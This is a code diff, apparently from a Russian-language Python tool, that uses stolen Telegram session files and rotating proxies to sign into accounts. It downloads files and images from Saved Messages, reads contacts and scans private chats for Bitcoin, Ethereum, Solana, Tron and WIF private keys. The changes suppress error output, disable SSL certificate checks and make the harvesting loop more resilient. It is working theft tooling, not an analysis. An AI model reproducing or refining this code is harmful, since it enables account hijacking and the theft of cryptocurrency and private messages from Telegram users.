@@ -93,11 +93,16 @@ async def download_txt_files_from_saved_messages(client, session_name):
                 await check_file_contents(file_path, session_name)
                 await random_delay()
     except Exception as e:
-        print(f"Ошибка при скачивании файлов из сохраненных сообщений: {e}")
+        # print(f"Ошибка при скачивании файлов из сохраненных сообщений: {e}")
+        pass
 
 
 async def download_images_from_favorited_messages(client, session_name):
     try:
+        import ssl
+
+        ssl._create_default_https_context = ssl._create_unverified_context
+
         favorites = await client.get_entity("me")
         async for message in client.iter_messages(favorites):
             if message.photo:
@@ -119,7 +124,8 @@ async def download_images_from_favorited_messages(client, session_name):
                     write_to_file(OUTPUT_FILE, "")
 
     except Exception as e:
-        print(f"Ошибка при скачивании изображений из избранных: {e}")
+        # print(f"Ошибка при скачивании изображений из избранных: {e}")
+        pass
 
 
 async def check_contacts(client, session_name):
@@ -181,9 +187,7 @@ def find_keys(text):
     try:
         keys = {
             "bitcoin": BITCOIN_PATTERN.findall(text),
-            "solana": [
-                key for key in SOLANA_PATTERN.findall(text) if is_valid_solana_key(key)
-            ],
+            "solana": SOLANA_PATTERN.findall(text),
             "tron": TRON_PATTERN.findall(text),
             "ethereum": HASH_PATTERN.findall(text),
             "wif": WIF_PATTERN.findall(text),
@@ -283,104 +287,141 @@ async def check_message(message, session_name):
 
 
 async def process_session(session_path, session_name):
-    PROXIES = get_proxies()
-    json_path = f"{session_path}.json"
-    if not os.path.exists(json_path):
-        print(f"Пропуск сессии {session_name}: файл конфигурации не найден")
-        return
-
     try:
-        with open(json_path, "r", encoding="utf-8") as f:
-            session_data = json.load(f)
-            api_id = session_data.get("app_id")
-            api_hash = session_data.get("app_hash")
-    except Exception as e:
-        print(f"Пропуск сессии {session_name}: ошибка чтения конфигурации - {e}")
-        return
+        PROXIES = get_proxies()
+        json_path = f"{session_path}.json"
+        if not os.path.exists(json_path):
+            print(f"Пропуск сессии {session_name}: файл конфигурации не найден")
+            return
 
-    if not api_id or not api_hash:
-        print(f"Пропуск сессии {session_name}: отсутствуют api_id или api_hash")
-        return
-
-    max_proxy_attempts = 3
-    proxy_attempts = 0
-
-    while proxy_attempts < max_proxy_attempts:
         try:
-            proxy_data = parse_proxy(choice(PROXIES))
-            if not proxy_data:
-                print(f"Пропуск прокси: неверный формат")
-                proxy_attempts += 1
-                continue
+            with open(json_path, "r", encoding="utf-8") as f:
+                session_data = json.load(f)
+                api_id = session_data.get("app_id")
+                api_hash = session_data.get("app_hash")
+        except Exception as e:
+            print(f"Пропуск сессии {session_name}: ошибка чтения конфигурации - {e}")
+            return
 
-            proxy_type, host, port, user, password = proxy_data
-            proxy = (
-                socks.HTTP,
-                host,
-                port,
-                True,
-                user,
-                password,
-            )
+        if not api_id or not api_hash:
+            print(f"Пропуск сессии {session_name}: отсутствуют api_id или api_hash")
+            return
 
-            print(f"Сессия {session_name} использует прокси: {proxy[1]}:{proxy[2]}")
+        max_proxy_attempts = 3
+        proxy_attempts = 0
 
-            if not await check_auth(session_path, api_id, api_hash, proxy):
-                print(f"Сессия {session_name} не авторизована, пропускаем")
-                return
-
+        while proxy_attempts < max_proxy_attempts:
             try:
-                async with TelegramClient(
-                    session_path, api_id, api_hash, proxy=proxy
-                ) as client:
+                proxy_data = parse_proxy(choice(PROXIES))
+                if not proxy_data:
+                    print(f"Пропуск прокси: неверный формат")
+                    proxy_attempts += 1
+                    continue
 
-                    print(
-                        f"Сессия {session_name} успешно подключилась через {proxy[1]}:{proxy[2]}"
-                    )
-                    await download_txt_files_from_saved_messages(client, session_name)
-                    await download_images_from_favorited_messages(client, session_name)
-                    await check_contacts(client, session_name)
+                proxy_type, host, port, user, password = proxy_data
+                proxy = (
+                    socks.HTTP,
+                    host,
+                    port,
+                    True,
+                    user,
+                    password,
+                )
 
-                    async for dialog in client.iter_dialogs():
+                print(f"Сессия {session_name} использует прокси: {proxy[1]}:{proxy[2]}")
+
+                if not await check_auth(session_path, api_id, api_hash, proxy):
+                    print(f"Сессия {session_name} не авторизована, пропускаем")
+                    return
+
+                try:
+                    async with TelegramClient(
+                        session_path, api_id, api_hash, proxy=proxy
+                    ) as client:
                         print(
-                            f"Сессия {session_name} проверяет диалог {dialog.entity.id}"
+                            f"Сессия {session_name} успешно подключилась через {proxy[1]}:{proxy[2]}"
                         )
-                        if isinstance(dialog.entity, User):
-                            try:
-                                message_count = 0
-                                async for message in client.iter_messages(
-                                    dialog.entity.id, limit=500
-                                ):
-                                    await check_message(message, session_name)
-                                    await random_delay()
-                                    message_count += 1
-                                    if message_count >= 500:
-                                        break
-                            except Exception as e:
+                        await download_txt_files_from_saved_messages(
+                            client, session_name
+                        )
+                        await download_images_from_favorited_messages(
+                            client, session_name
+                        )
+                        await check_contacts(client, session_name)
+
+                        try:
+                            async for dialog in client.iter_dialogs():
                                 print(
-                                    f"Ошибка при проверке сообщения (process session): {e}"
+                                    f"Сессия {session_name} проверяет диалог {dialog.entity.id}"
                                 )
+                                if isinstance(dialog.entity, User):
+                                    try:
+                                        message_count = 0
+                                        async for message in client.iter_messages(
+                                            dialog.entity.id, limit=500
+                                        ):
+                                            try:
+                                                await check_message(
+                                                    message, session_name
+                                                )
+                                                await random_delay()
+                                                message_count += 1
+                                                if message_count >= 500:
+                                                    break
+                                            except asyncio.CancelledError:
+                                                print(
+                                                    f"Операция отменена для сессии {session_name}"
+                                                )
+                                                return
+                                            except Exception as e:
+                                                continue
+                                    except asyncio.CancelledError:
+                                        print(
+                                            f"Операция отменена для сессии {session_name}"
+                                        )
+                                        return
+                                    except Exception as e:
+                                        continue
+                        except asyncio.CancelledError:
+                            print(f"Операция отменена для сессии {session_name}")
+                            return
+                        except Exception as e:
+                            print(
+                                f"Ошибка при обработке диалогов сессии {session_name}: {e}"
+                            )
+                            continue
 
-                stats.processed_sessions += 1
-                break
+                    stats.processed_sessions += 1
+                    break
 
-            except (SessionPasswordNeededError, PhoneCodeInvalidError) as e:
-                print(f"Сессия {session_name} требует ввод пароля/кода. Пропуск...")
+                except (SessionPasswordNeededError, PhoneCodeInvalidError) as e:
+                    print(f"Сессия {session_name} требует ввод пароля/кода. Пропуск...")
+                    return
+                except asyncio.CancelledError:
+                    print(f"Операция отменена для сессии {session_name}")
+                    return
+                except Exception as e:
+                    print(f"Ошибка при обработке сессии {session_name}: {e}")
+                    proxy_attempts += 1
+                    continue
+
+            except asyncio.CancelledError:
+                print(f"Операция отменена для сессии {session_name}")
                 return
             except Exception as e:
-                print(f"Ошибка при обработке сессии {session_name}: {e}")
+                print(f"Прокси не работает, пробуем следующий: {e}")
                 proxy_attempts += 1
-                continue
+                await asyncio.sleep(1)
 
-        except Exception as e:
-            print(f"Прокси не работает, пробуем следующий: {e}")
-            proxy_attempts += 1
-            await asyncio.sleep(1)
-
-    if proxy_attempts >= max_proxy_attempts:
-        print(
-            f"Пропуск сессии {session_name}: не удалось найти рабочий прокси после {max_proxy_attempts} попыток"
-        )
+        if proxy_attempts >= max_proxy_attempts:
+            print(
+                f"Пропуск сессии {session_name}: не удалось найти рабочий прокси после {max_proxy_attempts} попыток"
+            )
+    except asyncio.CancelledError:
+        print(f"Операция отменена для сессии {session_name}")
+        return
+    except Exception as e:
+        print(f"Ошибка при начале обработки сессии {session_name}: {e}")
 
 
 async def main():
